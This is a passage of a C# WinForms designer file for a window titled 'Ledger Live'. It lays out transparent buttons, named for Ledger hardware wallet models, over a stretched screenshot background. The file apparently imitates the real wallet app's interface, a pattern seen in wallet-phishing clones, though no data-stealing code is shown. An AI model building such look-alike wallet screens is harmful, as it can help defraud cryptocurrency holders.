            this.cuiButton4.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton4.Location = new System.Drawing.Point(1225, 13);
            this.cuiButton4.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton4.Name = "cuiButton4";
            this.cuiButton4.NormalBackground = System.Drawing.Color.Transparent;
            this.cuiButton4.NormalForeColor = System.Drawing.Color.Black;
            this.cuiButton4.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton4.NormalOutline = System.Drawing.Color.DimGray;
            this.cuiButton4.OutlineThickness = 1F;
            this.cuiButton4.PressedBackground = System.Drawing.Color.Transparent;
            this.cuiButton4.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton4.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton4.PressedOutline = System.Drawing.Color.Olive;
            this.cuiButton4.Rounding = new System.Windows.Forms.Padding(0);
            this.cuiButton4.Size = new System.Drawing.Size(243, 276);
            this.cuiButton4.TabIndex = 8;
            this.cuiButton4.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton4.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton4.Click += new System.EventHandler(this.cuiButton4_Click);
            // 
            // cuiButton5
            // 
            this.cuiButton5.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.cuiButton5.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton5.CheckButton = false;
            this.cuiButton5.Checked = false;
            this.cuiButton5.CheckedBackground = System.Drawing.Color.Transparent;
            this.cuiButton5.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton5.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton5.CheckedOutline = System.Drawing.Color.Olive;
            this.cuiButton5.Content = "";
            this.cuiButton5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton5.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.cuiButton5.ForeColor = System.Drawing.Color.Black;
            this.cuiButton5.HoverBackground = System.Drawing.Color.Transparent;
            this.cuiButton5.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton5.HoverForeColor = System.Drawing.Color.Black;
            this.cuiButton5.HoverOutline = System.Drawing.Color.Olive;
            this.cuiButton5.Image = null;
            this.cuiButton5.ImageAutoCenter = true;
            this.cuiButton5.ImageExpand = new System.Drawing.Point(0, 0);
            this.cuiButton5.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton5.Location = new System.Drawing.Point(1225, 296);
            this.cuiButton5.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton5.Name = "cuiButton5";
            this.cuiButton5.NormalBackground = System.Drawing.Color.Transparent;
            this.cuiButton5.NormalForeColor = System.Drawing.Color.Black;
            this.cuiButton5.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton5.NormalOutline = System.Drawing.Color.DimGray;
            this.cuiButton5.OutlineThickness = 1F;
            this.cuiButton5.PressedBackground = System.Drawing.Color.Transparent;
            this.cuiButton5.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton5.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton5.PressedOutline = System.Drawing.Color.Olive;
            this.cuiButton5.Rounding = new System.Windows.Forms.Padding(0);
            this.cuiButton5.Size = new System.Drawing.Size(243, 322);
            this.cuiButton5.TabIndex = 9;
            this.cuiButton5.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton5.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton5.Click += new System.EventHandler(this.cuiButton5_Click);
            // 
            // cuiButton6
            // 
            this.cuiButton6.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.cuiButton6.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton6.CheckButton = false;
            this.cuiButton6.Checked = false;
            this.cuiButton6.CheckedBackground = System.Drawing.Color.Transparent;
            this.cuiButton6.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton6.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton6.CheckedOutline = System.Drawing.Color.Olive;
            this.cuiButton6.Content = "";
            this.cuiButton6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton6.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.cuiButton6.ForeColor = System.Drawing.Color.Black;
            this.cuiButton6.HoverBackground = System.Drawing.Color.Transparent;
            this.cuiButton6.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton6.HoverForeColor = System.Drawing.Color.Black;
            this.cuiButton6.HoverOutline = System.Drawing.Color.Olive;
            this.cuiButton6.Image = null;
            this.cuiButton6.ImageAutoCenter = true;
            this.cuiButton6.ImageExpand = new System.Drawing.Point(0, 0);
            this.cuiButton6.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton6.Location = new System.Drawing.Point(1225, 626);
            this.cuiButton6.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton6.Name = "cuiButton6";
            this.cuiButton6.NormalBackground = System.Drawing.Color.Transparent;
            this.cuiButton6.NormalForeColor = System.Drawing.Color.Black;
            this.cuiButton6.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton6.NormalOutline = System.Drawing.Color.DimGray;
            this.cuiButton6.OutlineThickness = 1F;
            this.cuiButton6.PressedBackground = System.Drawing.Color.Transparent;
            this.cuiButton6.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton6.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton6.PressedOutline = System.Drawing.Color.Olive;
            this.cuiButton6.Rounding = new System.Windows.Forms.Padding(0);
            this.cuiButton6.Size = new System.Drawing.Size(243, 319);
            this.cuiButton6.TabIndex = 10;
            this.cuiButton6.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton6.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton6.Click += new System.EventHandler(this.cuiButton6_Click);
            // 
            // Page2
            // 
            this.Page2.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.Screenshot_2025_04_25_204108;
            this.Page2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Page2.Controls.Add(this.cuiButton10);
            this.Page2.Controls.Add(this.nanoSbtn);
            this.Page2.Controls.Add(this.Staxbtn);
            this.Page2.Controls.Add(this.Flexbtn);
            this.Page2.Controls.Add(this.nanoSplusbtn);
            this.Page2.Controls.Add(this.nanoXbtn);
            this.Page2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Page2.Location = new System.Drawing.Point(0, 0);
            this.Page2.Margin = new System.Windows.Forms.Padding(4);
            this.Page2.Name = "Page2";
            this.Page2.Size = new System.Drawing.Size(1604, 875);
            this.Page2.TabIndex = 3;
            this.Page2.Visible = false;
            // 
            // cuiButton10
            // 
            this.cuiButton10.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton10.CheckButton = false;
            this.cuiButton10.Checked = false;
            this.cuiButton10.CheckedBackground = System.Drawing.Color.Transparent;
            this.cuiButton10.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton10.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton10.CheckedOutline = System.Drawing.Color.DarkGray;
            this.cuiButton10.Content = "  Previous";
            this.cuiButton10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton10.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cuiButton10.ForeColor = System.Drawing.Color.White;
            this.cuiButton10.HoverBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton10.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton10.HoverForeColor = System.Drawing.Color.White;
            this.cuiButton10.HoverOutline = System.Drawing.Color.DarkGray;
            this.cuiButton10.Image = global::Ledger.MainClassFolder.Properties.Resources.Left_Arrow;
            this.cuiButton10.ImageAutoCenter = true;
            this.cuiButton10.ImageExpand = new System.Drawing.Point(3, 3);
            this.cuiButton10.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton10.Location = new System.Drawing.Point(36, 30);
            this.cuiButton10.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton10.Name = "cuiButton10";
            this.cuiButton10.NormalBackground = System.Drawing.Color.Transparent;
            this.cuiButton10.NormalForeColor = System.Drawing.Color.White;
            this.cuiButton10.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton10.NormalOutline = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton10.OutlineThickness = 1.6F;
            this.cuiButton10.PressedBackground = System.Drawing.Color.Transparent;
            this.cuiButton10.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton10.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton10.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton10.Rounding = new System.Windows.Forms.Padding(18);
            this.cuiButton10.Size = new System.Drawing.Size(141, 46);
            this.cuiButton10.TabIndex = 8;
            this.cuiButton10.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton10.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton10.Click += new System.EventHandler(this.cuiButton10_Click);
            // 
            // nanoSbtn
            // 
            this.nanoSbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
            this.nanoSbtn.BackColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.CheckButton = false;
            this.nanoSbtn.Checked = false;
            this.nanoSbtn.CheckedBackground = System.Drawing.Color.Transparent;
            this.nanoSbtn.CheckedForeColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.CheckedImageTint = System.Drawing.Color.Transparent;
            this.nanoSbtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.nanoSbtn.Content = "";
            this.nanoSbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.nanoSbtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.nanoSbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.nanoSbtn.ForeColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.HoverBackground = System.Drawing.Color.Transparent;
            this.nanoSbtn.HoveredImageTint = System.Drawing.Color.Transparent;
            this.nanoSbtn.HoverForeColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.HoverOutline = System.Drawing.Color.DimGray;
            this.nanoSbtn.Image = null;
            this.nanoSbtn.ImageAutoCenter = true;
            this.nanoSbtn.ImageExpand = new System.Drawing.Point(0, 0);
            this.nanoSbtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.nanoSbtn.Location = new System.Drawing.Point(595, -25);
            this.nanoSbtn.Margin = new System.Windows.Forms.Padding(4);
            this.nanoSbtn.Name = "nanoSbtn";
            this.nanoSbtn.NormalBackground = System.Drawing.Color.Transparent;
            this.nanoSbtn.NormalForeColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.NormalImageTint = System.Drawing.Color.Transparent;
            this.nanoSbtn.NormalOutline = System.Drawing.Color.Transparent;
            this.nanoSbtn.OutlineThickness = 1F;
            this.nanoSbtn.PressedBackground = System.Drawing.Color.Transparent;
            this.nanoSbtn.PressedForeColor = System.Drawing.Color.Transparent;
            this.nanoSbtn.PressedImageTint = System.Drawing.Color.Transparent;
            this.nanoSbtn.PressedOutline = System.Drawing.Color.DimGray;
            this.nanoSbtn.Rounding = new System.Windows.Forms.Padding(0);
            this.nanoSbtn.Size = new System.Drawing.Size(417, 918);
            this.nanoSbtn.TabIndex = 5;
            this.nanoSbtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.nanoSbtn.TextOffset = new System.Drawing.Point(0, 0);
            this.nanoSbtn.Click += new System.EventHandler(this.nanoSbtn_Click);
            // 
            // Staxbtn
            // 
            this.Staxbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
            this.Staxbtn.BackColor = System.Drawing.Color.Transparent;
            this.Staxbtn.CheckButton = false;
            this.Staxbtn.Checked = false;
            this.Staxbtn.CheckedBackground = System.Drawing.Color.Transparent;
            this.Staxbtn.CheckedForeColor = System.Drawing.Color.Transparent;
            this.Staxbtn.CheckedImageTint = System.Drawing.Color.Transparent;
            this.Staxbtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.Staxbtn.Content = "";
            this.Staxbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Staxbtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.Staxbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.Staxbtn.ForeColor = System.Drawing.Color.Transparent;
            this.Staxbtn.HoverBackground = System.Drawing.Color.Transparent;
            this.Staxbtn.HoveredImageTint = System.Drawing.Color.Transparent;
            this.Staxbtn.HoverForeColor = System.Drawing.Color.Transparent;
            this.Staxbtn.HoverOutline = System.Drawing.Color.DimGray;
            this.Staxbtn.Image = null;
            this.Staxbtn.ImageAutoCenter = true;
            this.Staxbtn.ImageExpand = new System.Drawing.Point(0, 0);
            this.Staxbtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.Staxbtn.Location = new System.Drawing.Point(-240, -25);
            this.Staxbtn.Margin = new System.Windows.Forms.Padding(4);
            this.Staxbtn.Name = "Staxbtn";
            this.Staxbtn.NormalBackground = System.Drawing.Color.Transparent;
            this.Staxbtn.NormalForeColor = System.Drawing.Color.Transparent;
            this.Staxbtn.NormalImageTint = System.Drawing.Color.Transparent;
            this.Staxbtn.NormalOutline = System.Drawing.Color.Transparent;
            this.Staxbtn.OutlineThickness = 1F;
            this.Staxbtn.PressedBackground = System.Drawing.Color.Transparent;
            this.Staxbtn.PressedForeColor = System.Drawing.Color.Transparent;
            this.Staxbtn.PressedImageTint = System.Drawing.Color.Transparent;
            this.Staxbtn.PressedOutline = System.Drawing.Color.DimGray;
            this.Staxbtn.Rounding = new System.Windows.Forms.Padding(0);
            this.Staxbtn.Size = new System.Drawing.Size(284, 918);
            this.Staxbtn.TabIndex = 4;
            this.Staxbtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.Staxbtn.TextOffset = new System.Drawing.Point(0, 0);
            this.Staxbtn.Click += new System.EventHandler(this.Staxbtn_Click);
            // 
            // Flexbtn
            // 
            this.Flexbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
            this.Flexbtn.BackColor = System.Drawing.Color.Transparent;
            this.Flexbtn.CheckButton = false;
            this.Flexbtn.Checked = false;
            this.Flexbtn.CheckedBackground = System.Drawing.Color.Transparent;
            this.Flexbtn.CheckedForeColor = System.Drawing.Color.Transparent;
            this.Flexbtn.CheckedImageTint = System.Drawing.Color.Transparent;
            this.Flexbtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.Flexbtn.Content = "";
            this.Flexbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Flexbtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.Flexbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.Flexbtn.ForeColor = System.Drawing.Color.Transparent;
            this.Flexbtn.HoverBackground = System.Drawing.Color.Transparent;
            this.Flexbtn.HoveredImageTint = System.Drawing.Color.Transparent;
            this.Flexbtn.HoverForeColor = System.Drawing.Color.Transparent;
            this.Flexbtn.HoverOutline = System.Drawing.Color.DimGray;
            this.Flexbtn.Image = null;
            this.Flexbtn.ImageAutoCenter = true;
            this.Flexbtn.ImageExpand = new System.Drawing.Point(0, 0);
            this.Flexbtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.Flexbtn.Location = new System.Drawing.Point(524, -47);
            this.Flexbtn.Margin = new System.Windows.Forms.Padding(4);
            this.Flexbtn.Name = "Flexbtn";
            this.Flexbtn.NormalBackground = System.Drawing.Color.Transparent;
            this.Flexbtn.NormalForeColor = System.Drawing.Color.Transparent;
            this.Flexbtn.NormalImageTint = System.Drawing.Color.Transparent;
            this.Flexbtn.NormalOutline = System.Drawing.Color.Transparent;
            this.Flexbtn.OutlineThickness = 1F;
            this.Flexbtn.PressedBackground = System.Drawing.Color.Transparent;
            this.Flexbtn.PressedForeColor = System.Drawing.Color.Transparent;
            this.Flexbtn.PressedImageTint = System.Drawing.Color.Transparent;
            this.Flexbtn.PressedOutline = System.Drawing.Color.DimGray;
            this.Flexbtn.Rounding = new System.Windows.Forms.Padding(0);
            this.Flexbtn.Size = new System.Drawing.Size(417, 918);
            this.Flexbtn.TabIndex = 3;
            this.Flexbtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.Flexbtn.TextOffset = new System.Drawing.Point(0, 0);
            this.Flexbtn.Click += new System.EventHandler(this.Flexbtn_Click);
            // 
            // nanoSplusbtn
            // 
            this.nanoSplusbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
            this.nanoSplusbtn.BackColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.CheckButton = false;
            this.nanoSplusbtn.Checked = false;
            this.nanoSplusbtn.CheckedBackground = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.CheckedForeColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.CheckedImageTint = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.nanoSplusbtn.Content = "";
            this.nanoSplusbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.nanoSplusbtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.nanoSplusbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.nanoSplusbtn.ForeColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.HoverBackground = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.HoveredImageTint = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.HoverForeColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.HoverOutline = System.Drawing.Color.DimGray;
            this.nanoSplusbtn.Image = null;
            this.nanoSplusbtn.ImageAutoCenter = true;
            this.nanoSplusbtn.ImageExpand = new System.Drawing.Point(0, 0);
            this.nanoSplusbtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.nanoSplusbtn.Location = new System.Drawing.Point(1012, -25);
            this.nanoSplusbtn.Margin = new System.Windows.Forms.Padding(4);
            this.nanoSplusbtn.Name = "nanoSplusbtn";
            this.nanoSplusbtn.NormalBackground = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.NormalForeColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.NormalImageTint = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.NormalOutline = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.OutlineThickness = 1F;
            this.nanoSplusbtn.PressedBackground = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.PressedForeColor = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.PressedImageTint = System.Drawing.Color.Transparent;
            this.nanoSplusbtn.PressedOutline = System.Drawing.Color.DimGray;
            this.nanoSplusbtn.Rounding = new System.Windows.Forms.Padding(0);
            this.nanoSplusbtn.Size = new System.Drawing.Size(417, 918);
            this.nanoSplusbtn.TabIndex = 2;
            this.nanoSplusbtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.nanoSplusbtn.TextOffset = new System.Drawing.Point(0, 0);
            this.nanoSplusbtn.Click += new System.EventHandler(this.nanoSplusbtn_Click);
            // 
            // nanoXbtn
            // 
            this.nanoXbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
            this.nanoXbtn.BackColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.CheckButton = false;
            this.nanoXbtn.Checked = false;
            this.nanoXbtn.CheckedBackground = System.Drawing.Color.Transparent;
            this.nanoXbtn.CheckedForeColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.CheckedImageTint = System.Drawing.Color.Transparent;
            this.nanoXbtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.nanoXbtn.Content = "";
            this.nanoXbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.nanoXbtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.nanoXbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.nanoXbtn.ForeColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.HoverBackground = System.Drawing.Color.Transparent;
            this.nanoXbtn.HoveredImageTint = System.Drawing.Color.Transparent;
            this.nanoXbtn.HoverForeColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.HoverOutline = System.Drawing.Color.DimGray;
            this.nanoXbtn.Image = null;
            this.nanoXbtn.ImageAutoCenter = true;
            this.nanoXbtn.ImageExpand = new System.Drawing.Point(0, 0);
            this.nanoXbtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.nanoXbtn.Location = new System.Drawing.Point(1429, -25);
            this.nanoXbtn.Margin = new System.Windows.Forms.Padding(4);
            this.nanoXbtn.Name = "nanoXbtn";
            this.nanoXbtn.NormalBackground = System.Drawing.Color.Transparent;
            this.nanoXbtn.NormalForeColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.NormalImageTint = System.Drawing.Color.Transparent;
            this.nanoXbtn.NormalOutline = System.Drawing.Color.Transparent;
            this.nanoXbtn.OutlineThickness = 1F;
            this.nanoXbtn.PressedBackground = System.Drawing.Color.Transparent;
            this.nanoXbtn.PressedForeColor = System.Drawing.Color.Transparent;
            this.nanoXbtn.PressedImageTint = System.Drawing.Color.Transparent;
            this.nanoXbtn.PressedOutline = System.Drawing.Color.DimGray;
            this.nanoXbtn.Rounding = new System.Windows.Forms.Padding(0);
            this.nanoXbtn.Size = new System.Drawing.Size(417, 918);
            this.nanoXbtn.TabIndex = 0;
            this.nanoXbtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.nanoXbtn.TextOffset = new System.Drawing.Point(0, 0);
            this.nanoXbtn.Load += new System.EventHandler(this.nanoXbtn_Load);
            this.nanoXbtn.Click += new System.EventHandler(this.nanoXbtn_Click);
            // 
            // MainFormBAOClass
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.ClientSize = new System.Drawing.Size(1604, 875);
            this.Controls.Add(this.Page2);
            this.Controls.Add(this.Page4);
            this.Controls.Add(this.Page3);
            this.Controls.Add(this.page1);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MinimumSize = new System.Drawing.Size(1598, 848);
            this.Name = "MainFormBAOClass";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Ledger Live";
            this.Load += new System.EventHandler(this.Ledger_Load);
            this.page1.ResumeLayout(false);
            this.panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.contextMenuStrip1.ResumeLayout(false);
            this.Page4.ResumeLayout(false);
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.Page3.ResumeLayout(false);
            this.Page3.PerformLayout();
            this.Page2.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        private void nanoXbtn_Load(object sender, EventArgs e)
        {

        }
    }
}*/